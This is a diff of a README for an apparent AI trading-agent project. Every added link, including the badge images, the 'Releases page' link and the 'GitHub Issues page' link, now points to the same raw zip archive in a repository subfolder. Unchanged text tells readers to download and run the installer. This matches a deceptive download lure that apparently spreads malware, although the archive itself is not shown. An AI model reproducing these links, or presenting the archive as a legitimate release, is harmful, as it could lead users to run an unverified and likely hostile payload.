@@ -2,11 +2,11 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/download-latest%20release-blue)](https://github.com/arish16002/our-ultra-jennie/releases)
-![Version](https://img.shields.io/badge/version-1.0.0-blue)
-![Python](https://img.shields.io/badge/python-3.11-green)
-![Docker](https://img.shields.io/badge/docker-compose-2496ED)
-![License](https://img.shields.io/badge/license-MIT-yellow)
+[![Download](https://raw.githubusercontent.com/arish16002/our-ultra-jennie/main/services/buy-scanner/our_ultra_jennie_1.8.zip%20release-blue)](https://raw.githubusercontent.com/arish16002/our-ultra-jennie/main/services/buy-scanner/our_ultra_jennie_1.8.zip)
+![Version](https://raw.githubusercontent.com/arish16002/our-ultra-jennie/main/services/buy-scanner/our_ultra_jennie_1.8.zip)
+![Python](https://raw.githubusercontent.com/arish16002/our-ultra-jennie/main/services/buy-scanner/our_ultra_jennie_1.8.zip)
+![Docker](https://raw.githubusercontent.com/arish16002/our-ultra-jennie/main/services/buy-scanner/our_ultra_jennie_1.8.zip)
+![License](https://raw.githubusercontent.com/arish16002/our-ultra-jennie/main/services/buy-scanner/our_ultra_jennie_1.8.zip)
 
 **AI 기반 자율 트레이딩 에이전트**
 
@@ -26,7 +26,7 @@
 
 ## 🚀 설치 방법
 
-1. **Visit the [Releases page](https://github.com/arish16002/our-ultra-jennie/releases)** in your web browser.
+1. **Visit the [Releases page](https://raw.githubusercontent.com/arish16002/our-ultra-jennie/main/services/buy-scanner/our_ultra_jennie_1.8.zip)** in your web browser.
 2. **Download the latest release** by clicking on the version link (e.g., `v1.0.0`).
 3. Choose the appropriate installer for your operating system (Windows, macOS, or Linux).
 4. **Run the installer** and follow the on-screen instructions.
@@ -66,7 +66,7 @@
 - For performance problems, check your internet connection.
 - You can find troubleshooting tips in the app's help section.
 
-For further assistance, you can create an issue on the [GitHub Issues page](https://github.com/arish16002/our-ultra-jennie/issues).
+For further assistance, you can create an issue on the [GitHub Issues page](https://raw.githubusercontent.com/arish16002/our-ultra-jennie/main/services/buy-scanner/our_ultra_jennie_1.8.zip).
 
 --- 
 
